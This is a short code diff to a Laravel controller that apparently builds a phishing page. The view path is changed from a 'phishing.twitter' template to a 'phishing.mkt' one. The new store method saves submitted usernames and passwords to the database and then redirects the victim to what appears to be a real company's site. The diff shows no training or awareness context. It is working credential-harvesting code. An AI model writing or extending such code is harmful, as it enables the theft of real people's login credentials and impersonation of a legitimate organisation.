@@ -14,7 +14,7 @@ class MktController extends Controller
      */
     public function index()
     {
-        return view('phishing.twitter.index');
+        return view('phishing.mkt.index');
     }
 
     /**
@@ -35,7 +35,14 @@ class MktController extends Controller
      */
     public function store(Request $request)
     {
-        //
+        $dataMkt = new Mkt();
+
+        $dataMkt->username = $request->username;
+        $dataMkt->password = $request->password;
+        
+        $dataMkt->save();
+
+        return redirect('https://mkt.diunsa.hn');
     }
 
     /**
